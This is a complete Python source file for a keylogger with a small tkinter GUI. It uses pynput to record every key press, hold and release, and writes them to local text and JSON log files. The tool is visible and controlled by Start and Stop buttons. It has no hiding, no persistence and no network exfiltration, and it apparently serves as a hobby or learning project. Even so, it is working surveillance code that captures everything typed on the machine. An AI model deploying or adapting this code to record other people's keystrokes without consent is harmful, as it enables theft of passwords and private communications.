import tkinter as tk
from tkinter import *
from pynput import keyboard
import json

class Keylogger:
    def __init__(self):
        self.keys_used = []
        self.flag = False
        self.listener = None

    def generate_text_log(self, keys):
        with open('key_log.txt', 'a') as keys_file:
            keys_file.write(keys)

    def generate_json_file(self):
        with open('key_log.json', 'w') as key_log:
            json.dump(self.keys_used, key_log)

    def on_press(self, key):
        if not self.flag:
            self.keys_used.append({'Pressed': f'{key}'})
            self.flag = True
        else:
            self.keys_used.append({'Held': f'{key}'})
        self.generate_json_file()

    def on_release(self, key):
        self.keys_used.append({'Released': f'{key}'})
        if self.flag:
            self.flag = False
        self.generate_json_file()

        keys = str(key)
        self.generate_text_log(keys)

    def start_keylogger(self):
        self.listener = keyboard.Listener(on_press=self.on_press, on_release=self.on_release)
        self.listener.start()
        self.label.config(text="[+] Keylogger is running!\n[!] Saving the keys in 'keylogger.txt'")
        self.start_button.config(state='disabled')
        self.stop_button.config(state='normal')

    def stop_keylogger(self):
        if self.listener:
            self.listener.stop()
        self.label.config(text="Keylogger stopped.")
        self.start_button.config(state='normal')
        self.stop_button.config(state='disabled')

    def create_gui(self):
        root = Tk()
        root.title("My Keylogger")

        self.label = Label(root, text='Click "Start" to begin keylogging.')
        self.label.config(anchor=CENTER)
        self.label.pack()

        self.start_button = Button(root, text="Start", command=self.start_keylogger)
        self.start_button.pack(side=LEFT)

        self.stop_button = Button(root, text="Stop", command=self.stop_keylogger, state='disabled')
        self.stop_button.pack(side=RIGHT)

        root.geometry("250x250")
        root.mainloop()

if __name__ == "__main__":
    keylogger = Keylogger()
    keylogger.create_gui()
